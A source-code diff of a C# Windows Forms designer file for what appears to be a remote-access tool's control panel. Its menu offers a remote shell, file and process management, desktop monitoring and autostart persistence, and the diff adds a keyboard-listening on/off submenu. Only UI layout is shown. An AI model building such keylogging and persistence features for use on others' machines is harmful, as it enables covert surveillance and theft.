@@ -42,11 +42,14 @@
             this.FileContral = new System.Windows.Forms.ToolStripMenuItem();
             this.DesktopContral = new System.Windows.Forms.ToolStripMenuItem();
             this.ProcessContral = new System.Windows.Forms.ToolStripMenuItem();
-            this.Edit = new System.Windows.Forms.ToolStripMenuItem();
-            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
             this.AutoRunContral = new System.Windows.Forms.ToolStripMenuItem();
             this.Registry = new System.Windows.Forms.ToolStripMenuItem();
             this.TaskScheduler = new System.Windows.Forms.ToolStripMenuItem();
+            this.Edit = new System.Windows.Forms.ToolStripMenuItem();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.KeyBoardListend = new System.Windows.Forms.ToolStripMenuItem();
+            this.On = new System.Windows.Forms.ToolStripMenuItem();
+            this.Off = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuStrip1.SuspendLayout();
             this.SuspendLayout();
             // 
@@ -63,10 +66,10 @@
             this.listView1.FullRowSelect = true;
             this.listView1.GridLines = true;
             this.listView1.HideSelection = false;
-            this.listView1.Location = new System.Drawing.Point(12, 21);
-            this.listView1.Margin = new System.Windows.Forms.Padding(4);
+            this.listView1.Location = new System.Drawing.Point(6, 10);
+            this.listView1.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
             this.listView1.Name = "listView1";
-            this.listView1.Size = new System.Drawing.Size(1347, 417);
+            this.listView1.Size = new System.Drawing.Size(676, 202);
             this.listView1.TabIndex = 0;
             this.listView1.UseCompatibleStateImageBehavior = false;
             this.listView1.View = System.Windows.Forms.View.Details;
@@ -119,43 +122,67 @@
             this.FileContral,
             this.DesktopContral,
             this.ProcessContral,
+            this.KeyBoardListend,
             this.AutoRunContral,
             this.Edit});
             this.contextMenuStrip1.Name = "contextMenuStrip1";
-            this.contextMenuStrip1.Size = new System.Drawing.Size(301, 276);
+            this.contextMenuStrip1.Size = new System.Drawing.Size(181, 180);
             // 
             // GetShell
             // 
             this.GetShell.Name = "GetShell";
-            this.GetShell.Size = new System.Drawing.Size(300, 38);
+            this.GetShell.Size = new System.Drawing.Size(180, 22);
             this.GetShell.Text = "Shell";
             this.GetShell.Click += new System.EventHandler(this.GetShell_Click);
             // 
             // FileContral
             // 
             this.FileContral.Name = "FileContral";
-            this.FileContral.Size = new System.Drawing.Size(300, 38);
+            this.FileContral.Size = new System.Drawing.Size(180, 22);
             this.FileContral.Text = "文件管理";
             this.FileContral.Click += new System.EventHandler(this.FileContral_Click);
             // 
             // DesktopContral
             // 
             this.DesktopContral.Name = "DesktopContral";
-            this.DesktopContral.Size = new System.Drawing.Size(300, 38);
+            this.DesktopContral.Size = new System.Drawing.Size(180, 22);
             this.DesktopContral.Text = "桌面监控";
             this.DesktopContral.Click += new System.EventHandler(this.DesktopContral_Click);
             // 
             // ProcessContral
             // 
             this.ProcessContral.Name = "ProcessContral";
-            this.ProcessContral.Size = new System.Drawing.Size(300, 38);
+            this.ProcessContral.Size = new System.Drawing.Size(180, 22);
             this.ProcessContral.Text = "进程管理";
             this.ProcessContral.Click += new System.EventHandler(this.ProcessContral_Click);
+            // 
+            // AutoRunContral
+            // 
+            this.AutoRunContral.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.Registry,
+            this.TaskScheduler});
+            this.AutoRunContral.Name = "AutoRunContral";
+            this.AutoRunContral.Size = new System.Drawing.Size(180, 22);
+            this.AutoRunContral.Text = "自启动";
+            // 
+            // Registry
+            // 
+            this.Registry.Name = "Registry";
+            this.Registry.Size = new System.Drawing.Size(148, 22);
+            this.Registry.Text = "通过注册表";
+            this.Registry.Click += new System.EventHandler(this.Registry_Click);
+            // 
+            // TaskScheduler
+            // 
+            this.TaskScheduler.Name = "TaskScheduler";
+            this.TaskScheduler.Size = new System.Drawing.Size(148, 22);
+            this.TaskScheduler.Text = "通过计划任务";
+            this.TaskScheduler.Click += new System.EventHandler(this.TaskScheduler_Click);
             // 
             // Edit
             // 
             this.Edit.Name = "Edit";
-            this.Edit.Size = new System.Drawing.Size(300, 38);
+            this.Edit.Size = new System.Drawing.Size(180, 22);
             this.Edit.Text = "设置响应时间";
             this.Edit.Click += new System.EventHandler(this.Edit_Click);
             // 
@@ -164,46 +191,46 @@
             this.richTextBox1.BackColor = System.Drawing.SystemColors.MenuText;
             this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.125F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.richTextBox1.ForeColor = System.Drawing.Color.Lime;
-            this.richTextBox1.Location = new System.Drawing.Point(12, 462);
-            this.richTextBox1.Margin = new System.Windows.Forms.Padding(4);
+            this.richTextBox1.Location = new System.Drawing.Point(6, 222);
+            this.richTextBox1.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
             this.richTextBox1.Name = "richTextBox1";
-            this.richTextBox1.Size = new System.Drawing.Size(1347, 375);
+            this.richTextBox1.Size = new System.Drawing.Size(676, 182);
             this.richTextBox1.TabIndex = 1;
             this.richTextBox1.Text = "";
             this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
             // 
-            // AutoRunContral
+            // KeyBoardListend
             // 
-            this.AutoRunContral.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.Registry,
-            this.TaskScheduler});
-            this.AutoRunContral.Name = "AutoRunContral";
-            this.AutoRunContral.Size = new System.Drawing.Size(300, 38);
-            this.AutoRunContral.Text = "自启动";
+            this.KeyBoardListend.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.On,
+            this.Off});
+            this.KeyBoardListend.Name = "KeyBoardListend";
+            this.KeyBoardListend.Size = new System.Drawing.Size(180, 22);
+            this.KeyBoardListend.Text = "键盘监听";
             // 
-            // Registry
+            // On
             // 
-            this.Registry.Name = "Registry";
-            this.Registry.Size = new System.Drawing.Size(359, 44);
-            this.Registry.Text = "通过注册表";
-            this.Registry.Click += new System.EventHandler(this.Registry_Click);
+            this.On.Name = "On";
+            this.On.Size = new System.Drawing.Size(180, 22);
+            this.On.Text = "开";
+            this.On.Click += new System.EventHandler(this.On_Click);
             // 
-            // TaskScheduler
+            // Off
             // 
-            this.TaskScheduler.Name = "TaskScheduler";
-            this.TaskScheduler.Size = new System.Drawing.Size(359, 44);
-            this.TaskScheduler.Text = "通过计划任务";
-            this.TaskScheduler.Click += new System.EventHandler(this.TaskScheduler_Click);
+            this.Off.Name = "Off";
+            this.Off.Size = new System.Drawing.Size(180, 22);
+            this.Off.Text = "关";
+            this.Off.Click += new System.EventHandler(this.Off_Click);
             // 
             // Form1
             // 
-            this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(1372, 848);
+            this.ClientSize = new System.Drawing.Size(686, 407);
             this.Controls.Add(this.richTextBox1);
             this.Controls.Add(this.listView1);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
-            this.Margin = new System.Windows.Forms.Padding(4);
+            this.Margin = new System.Windows.Forms.Padding(2, 2, 2, 2);
             this.MaximizeBox = false;
             this.Name = "Form1";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
@@ -234,6 +261,9 @@
         private System.Windows.Forms.ToolStripMenuItem AutoRunContral;
         private System.Windows.Forms.ToolStripMenuItem Registry;
         private System.Windows.Forms.ToolStripMenuItem TaskScheduler;
+        private System.Windows.Forms.ToolStripMenuItem KeyBoardListend;
+        private System.Windows.Forms.ToolStripMenuItem On;
+        private System.Windows.Forms.ToolStripMenuItem Off;
     }
 }
 
